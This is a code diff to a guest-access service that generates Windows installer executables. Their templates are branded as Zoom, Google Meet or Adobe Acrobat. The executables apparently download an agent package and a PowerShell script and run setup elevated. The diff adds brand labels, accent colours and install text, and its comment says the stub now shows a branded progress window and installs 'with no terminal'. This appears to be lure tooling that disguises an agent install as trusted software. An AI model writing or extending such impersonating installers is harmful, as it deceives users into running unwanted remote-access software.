@@ -84,28 +84,20 @@ export const GUEST_SETUP_EXE_MARKER = 'NDGUESTCFG\x00';
 
 function exeInstallerCopy(template?: string | null): {
   title: string;
+  brand: string;
+  accent: string;
   downloading: string;
+  installing: string;
   finished: string;
 } {
+  const gui = guiInstallerBranding(template);
   const brand = installerBranding(template);
-  const t = normalizeTemplate(template);
-  if (t === 'google_meet') {
-    return {
-      title: brand.windowTitle,
-      downloading: 'Downloading Google Meet components...\nPlease wait.',
-      finished: brand.closingEcho,
-    };
-  }
-  if (t === 'adobe') {
-    return {
-      title: brand.windowTitle,
-      downloading: 'Downloading Adobe Acrobat components...\nPlease wait.',
-      finished: brand.closingEcho,
-    };
-  }
   return {
     title: brand.windowTitle,
-    downloading: 'Downloading Zoom Client components...\nPlease wait.',
+    brand: gui.brandLabel,
+    accent: gui.accent,
+    downloading: gui.downloadLabel,
+    installing: gui.installLabel,
     finished: brand.closingEcho,
   };
 }
@@ -341,7 +333,7 @@ export class GuestAccessService {
       organizationSlug: org?.slug ?? '',
       expiresAt: link.expiresAt.toISOString(),
       remainingUses: Math.max(0, link.maxUses - link.usedCount),
-      windowsInstallerUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/${installerDownloadPath(link.inviteTemplate)}?v=30`,
+      windowsInstallerUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/${installerDownloadPath(link.inviteTemplate)}?v=31`,
       installerFileName: installerGuiFilename(link.inviteTemplate),
       windowsScriptUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/windows.ps1`,
       agentPackageUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/agent-package.zip`,
@@ -408,8 +400,7 @@ export class GuestAccessService {
 
   /**
    * Guest templates download a real .exe (Zoom / Meet / Adobe).
-   * The stub performs the same enroll path: download zip + windows.ps1,
-   * then run PowerShell setup elevated.
+   * Stub shows a branded GUI progress window and installs with no terminal.
    */
   buildWindowsExeLauncher(code: string, apiUrl: string, stub: Buffer, template?: string | null): Buffer {
     const copy = exeInstallerCopy(template);
@@ -418,7 +409,10 @@ export class GuestAccessService {
         apiUrl: apiUrl.replace(/\/$/, ''),
         guestCode: code,
         title: copy.title,
+        brand: copy.brand,
+        accent: copy.accent,
         downloading: copy.downloading,
+        installing: copy.installing,
         finished: copy.finished,
       }),
       'utf8',
